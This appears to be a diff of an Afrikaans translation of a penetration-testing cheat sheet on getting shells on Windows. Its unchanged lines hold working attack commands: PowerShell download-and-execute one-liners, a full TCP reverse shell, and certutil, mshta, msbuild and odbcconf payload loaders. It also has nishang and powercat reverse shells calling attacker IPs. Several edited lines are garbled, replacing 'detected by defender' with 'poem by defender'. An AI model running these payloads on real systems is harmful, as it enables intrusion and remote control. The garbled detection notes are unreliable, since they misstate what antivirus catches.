@@ -94,7 +94,7 @@ Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadStr
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
 Proses wat netwerkoproep uitvoer: **powershell.exe**\
-Payload op skyf geskryf: **NEE** (_ten minste nêrens waar ek met procmon kon vind!_)
+Payload op skyf geskryf: **NEE** (_ten minste nêrens waar ek met procmon kon vind !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -105,7 +105,7 @@ Payload op skyf geskryf: **WebDAV-kliënt plaaslike kas**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Kry meer inligting oor verskillende Powershell Shells aan die einde van hierdie dokument**
+**Kry meer inligting oor verskillende Powershell-shelle aan die einde van hierdie dokument**
 
 ## Mshta
 
@@ -173,14 +173,14 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Gedeelte deur verdediger**
+**Gedig deur verdediger**
 
 
 
 
 ## **Rundll32**
 
-[**Dll hallo wêreld voorbeeld**](https://github.com/carterjones/hello-world-dll)
+[**Dll hello world voorbeeld**](https://github.com/carterjones/hello-world-dll)
 
 * [Van hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -278,7 +278,7 @@ Laai 'n B64exe af, dekodeer dit en voer dit uit.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Gevind deur verdediger**
+**Gedeelte deur verdediger**
 
 
 ## **Cscript/Wscript**
@@ -305,7 +305,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Gevind deur verdediger**
+**Gedig deur verdediger**
 
 ## **MSIExec**
 
@@ -348,7 +348,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-U kan hierdie tegniek gebruik om toepassingswitlys en Powershell.exe-beperkings te omseil. U sal met 'n PS-skal gevra word.\
+U kan hierdie tegniek gebruik om toepassingswitlys en Powershell.exe beperkings te omseil. U sal met 'n PS-skal gevra word.\
 Laai net dit af en voer dit uit: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -357,7 +357,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compileer C# kode in die slagoffer masjien.
+Compileer C# kode op die slagoffer masjien.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -391,7 +391,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-In die **Skale** gids, is daar 'n klomp verskillende skale. Om Invoke-_PowerShellTcp.ps1_ te aflaai en uit te voer, maak 'n kopie van die skrif en voeg by die einde van die lêer:
+In die **Skale** gids, is daar 'n baie verskillende skale. Om Invoke-_PowerShellTcp.ps1_ te aflaai en uit te voer, maak 'n kopie van die skrif en voeg by die einde van die lêer:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
@@ -440,7 +440,7 @@ Skep 'n powershell-lanser, stoor dit in 'n lêer en laai dit af en voer dit uit.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Gevind as kwaadwillige kode**
+**Gedig as kwaadwillige kode**
 
 ### MSF-Unicorn
 
